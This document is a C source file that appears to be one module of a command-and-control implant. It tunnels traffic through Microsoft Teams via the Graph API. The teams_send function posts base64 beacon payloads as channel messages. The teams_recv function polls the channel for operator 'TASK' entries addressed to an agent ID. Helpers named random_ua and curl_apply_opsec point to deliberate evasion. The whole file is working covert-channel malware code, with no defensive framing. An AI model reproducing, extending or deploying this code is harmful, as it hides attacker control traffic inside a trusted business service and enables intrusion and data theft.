#include "channels.h"
#include "util.h"
#include <curl/curl.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#ifndef CURLSSLOPT_NATIVE_CA
#define CURLSSLOPT_NATIVE_CA (1 << 4)
#endif

/* ---- libcurl response buffer ---- */

typedef struct
{
    char *data;
    size_t len;
} curl_buf_t;

static size_t write_cb(void *ptr, size_t size, size_t nmemb, void *userdata)
{
    curl_buf_t *buf = (curl_buf_t *)userdata;
    size_t nb = size * nmemb;
    char *tmp = realloc(buf->data, buf->len + nb + 1);
    if (!tmp)
        return 0;
    buf->data = tmp;
    memcpy(buf->data + buf->len, ptr, nb);
    buf->len += nb;
    buf->data[buf->len] = '\0';
    return nb;
}

/* get an OAuth2 client_credentials token for the Graph API */

static char *teams_get_access_token(const channel_config_t *cfg)
{
    char url[256];
    snprintf(url, sizeof(url),
             "https://login.microsoftonline.com/%s/oauth2/v2.0/token",
             cfg->teams_tenant_id);

    char body[1024];
    snprintf(body, sizeof(body),
             "grant_type=client_credentials"
             "&client_id=%s"
             "&client_secret=%s"
             "&scope=https%%3A%%2F%%2Fgraph.microsoft.com%%2F.default",
             cfg->teams_client_id,
             cfg->teams_client_secret);

    CURL *curl = curl_easy_init();
    if (!curl)
        return NULL;

    curl_buf_t resp = {0};

    char ua_hdr[320];
    snprintf(ua_hdr, sizeof(ua_hdr), "User-Agent: %s", random_ua());

    struct curl_slist *hdrs = NULL;
    hdrs = curl_slist_append(hdrs, "Content-Type: application/x-www-form-urlencoded");
    hdrs = curl_slist_append(hdrs, ua_hdr);

    curl_apply_opsec(curl);
    curl_easy_setopt(curl, CURLOPT_URL, url);
    curl_easy_setopt(curl, CURLOPT_HTTPHEADER, hdrs);
    curl_easy_setopt(curl, CURLOPT_POSTFIELDS, body);
    curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_cb);
    curl_easy_setopt(curl, CURLOPT_WRITEDATA, &resp);
    curl_easy_setopt(curl, CURLOPT_TIMEOUT, 30L);

    CURLcode res = curl_easy_perform(curl);
    long code = 0;
    curl_easy_getinfo(curl, CURLINFO_RESPONSE_CODE, &code);
    curl_slist_free_all(hdrs);
    curl_easy_cleanup(curl);

    if (res != CURLE_OK || code != 200)
    {
        free(resp.data);
        return NULL;
    }

    /* Extract "access_token":"<value>" */
    const char *p = strstr(resp.data, "\"access_token\"");
    if (!p)
    {
        free(resp.data);
        return NULL;
    }
    p += strlen("\"access_token\"");
    while (*p == ' ' || *p == ':')
        p++;
    if (*p != '"')
    {
        free(resp.data);
        return NULL;
    }
    p++;

    size_t i = 0, cap = 2048;
    char *tok = malloc(cap);
    if (!tok)
    {
        free(resp.data);
        return NULL;
    }
    while (*p && *p != '"' && i < cap - 1)
        tok[i++] = *p++;
    tok[i] = '\0';
    free(resp.data);
    return tok;
}

/* make a request to the Microsoft Graph API */

static char *graph_request(const char *access_token, const char *url,
                           const char *method, const char *body_json)
{
    CURL *curl = curl_easy_init();
    if (!curl)
        return NULL;

    curl_buf_t resp = {0};

    struct curl_slist *hdrs = NULL;
    char auth_hdr[2400];
    char ua_hdr2[320];
    snprintf(auth_hdr, sizeof(auth_hdr), "Authorization: Bearer %s", access_token);
    snprintf(ua_hdr2, sizeof(ua_hdr2), "User-Agent: %s", random_ua());
    hdrs = curl_slist_append(hdrs, auth_hdr);
    hdrs = curl_slist_append(hdrs, "Content-Type: application/json");
    hdrs = curl_slist_append(hdrs, ua_hdr2);

    curl_apply_opsec(curl);
    curl_easy_setopt(curl, CURLOPT_URL, url);
    curl_easy_setopt(curl, CURLOPT_HTTPHEADER, hdrs);
    curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_cb);
    curl_easy_setopt(curl, CURLOPT_WRITEDATA, &resp);
    curl_easy_setopt(curl, CURLOPT_TIMEOUT, 30L);
    curl_easy_setopt(curl, CURLOPT_FOLLOWLOCATION, 1L);

    if (method && strcmp(method, "POST") == 0)
    {
        curl_easy_setopt(curl, CURLOPT_POST, 1L);
        if (body_json)
        {
            curl_easy_setopt(curl, CURLOPT_POSTFIELDS, body_json);
            curl_easy_setopt(curl, CURLOPT_POSTFIELDSIZE, (long)strlen(body_json));
        }
    }
    else if (method && strcmp(method, "GET") == 0)
    {
        curl_easy_setopt(curl, CURLOPT_HTTPGET, 1L);
    }

    CURLcode res = curl_easy_perform(curl);
    long code = 0;
    curl_easy_getinfo(curl, CURLINFO_RESPONSE_CODE, &code);
    curl_slist_free_all(hdrs);
    curl_easy_cleanup(curl);

    if (res != CURLE_OK || code < 200 || code >= 300)
    {
        free(resp.data);
        return NULL;
    }
    return resp.data;
}

/* post beacon as a Teams message in the configured channel */

int teams_send(const channel_config_t *cfg, const char *agent_id, const char *b64)
{
    if (!cfg->teams_tenant_id[0] || !cfg->teams_team_id[0])
        return CHANNEL_ERR;

    char *token = teams_get_access_token(cfg);
    if (!token)
        return CHANNEL_ERR;

    char url[512];
    snprintf(url, sizeof(url),
             "https://graph.microsoft.com/v1.0/teams/%s/channels/%s/messages",
             cfg->teams_team_id, cfg->teams_channel_id);

    /* message format: LC2:{agent_id}:{payload} */
    size_t body_sz = strlen(b64) + 256;
    char *body = malloc(body_sz);
    if (!body)
    {
        free(token);
        return CHANNEL_ERR;
    }

    snprintf(body, body_sz,
             "{\"body\":{\"contentType\":\"text\","
             "\"content\":\"LC2:%s:%s\"}}",
             agent_id, b64);

    char *resp = graph_request(token, url, "POST", body);
    free(body);
    free(token);

    if (!resp)
        return CHANNEL_ERR;
    free(resp);
    return CHANNEL_OK;
}

/* read latest channel messages and find a task for this agent */

char *teams_recv(const channel_config_t *cfg, const char *agent_id)
{
    if (!cfg->teams_tenant_id[0] || !cfg->teams_team_id[0])
        return NULL;

    char *token = teams_get_access_token(cfg);
    if (!token)
        return NULL;

    /* fetch last 10 messages */
    char url[512];
    snprintf(url, sizeof(url),
             "https://graph.microsoft.com/v1.0/teams/%s/channels/%s/messages"
             "?$top=10&$orderby=createdDateTime+desc",
             cfg->teams_team_id, cfg->teams_channel_id);

    char *resp = graph_request(token, url, "GET", NULL);
    free(token);
    if (!resp)
        return NULL;

    /*
     * Look for "TASK:{agent_id}:{b64}" in the message content.
     * The server posts tasks as: TASK:<agent_id>:<b64_payload>
     */
    char prefix[64];
    snprintf(prefix, sizeof(prefix), "TASK:%s:", agent_id);
    const char *p = strstr(resp, prefix);
    if (!p)
    {
        free(resp);
        return NULL;
    }
    p += strlen(prefix);

    /* Extract until end of JSON string (next \") */
    size_t i = 0, cap = 4096;
    char *out = malloc(cap);
    if (!out)
    {
        free(resp);
        return NULL;
    }

    while (*p && *p != '"' && *p != '\\' && i < cap - 1)
        out[i++] = *p++;
    out[i] = '\0';

    free(resp);
    if (i == 0)
    {
        free(out);
        return NULL;
    }
    return out;
}
